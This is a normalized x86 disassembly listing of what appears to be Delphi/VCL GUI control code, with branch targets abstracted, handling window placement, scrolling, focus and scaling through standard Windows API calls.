call sub_434b3c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_434b3c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_434b3c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44a5dc
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_434b3c
test eax eax
jne r-xdata
jmp r-xdata
sub_439a2c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_434b3c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_439a80
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_434b3c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44a5dc
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_434b3c
test eax eax
jne r-xdata
sub_439acc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4398b4
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_434b3c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44a5dc
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_434b3c
test eax eax
jne r-xdata
sub_439b28
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44a5dc
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_434b3c
mov [ esi + 0xc ] eax
sub_439b5c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43a474
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_432fc4
mov eax ebx
mov si 0xffd0
call sub_4032ec
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_433310
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_439c34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_436ea0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_436e64
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_4032ec
inc edi
dec ebx
jne r-xdata
sub_439c7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_436a08
xor eax eax
push ebp
push sub_439d1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439c34
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d21
mov eax [ ebp - 0x4 ]
call sub_436a10
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_439d28
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_436a30
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_436e64
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_439e18
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_4138bc
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413750
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_4138dc
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_413860
call sub_43a170
jmp r-xdata
mov eax ebp
mov edx esi
call sub_413860
call sub_43a170
sub_439ef0
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_439e18
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_439f50
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43a170
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_43a170
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
test eax eax
jne r-xdata
sub_439fb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a474
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_434b3c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_428284
call sub_428364
test al al
je r-xdata
mov eax ebx
call sub_436ea0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_436e64
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_436e64
test [ eax + 0x52 ] 0x4
je r-xdata
sub_43a078
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_433310
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_43a0b0
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_44a5dc
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_43a0f0
push ebx
mov ebx eax
mov eax ebx
call sub_44a5dc
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_44e348
pop ebx
retn
mov eax ebx
call sub_44a604
mov eax ebx
call sub_43a170
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_43a128
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43a14c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_43a14c
sub_43a184
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_41242c
mov eax edi
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_436e64
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_43a218
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_43a170
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_43a250
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43a474
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43a170
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_4032ec
sub_43a30c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_4138bc
pop esi
pop ebx
retn
sub_43a330
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a30c
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413750
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_4138dc
sub_43a3a4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_43a474
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_434b3c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_43a404
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_43a468
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a46f
lea eax [ ebp - 0x4 ]
call sub_4054e8
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_4032ec
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405500
sub_43a480
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_432fc4
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_43a538
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_413860
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413704
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_4032ec
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_43a598
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_43a68e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_4032ec
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a695
mov eax [ ebp - 0x14 ]
call sub_4030f0
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4138bc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_413860
mov edi eax
mov eax edi
mov si 0xffb8
call sub_4032ec
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_43a6a4
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_43a598
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_43a6d0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44a5dc
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43a598
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43a598
mov edx eax
mov eax esi
call sub_44e248
sub_43a714
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_436e64
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_43a75c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_439e18
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_433be0
sub_43a7a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43a828
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_43a474
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_436ea0
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_43abea
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_436ea0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_43a7a4
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_436e64
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
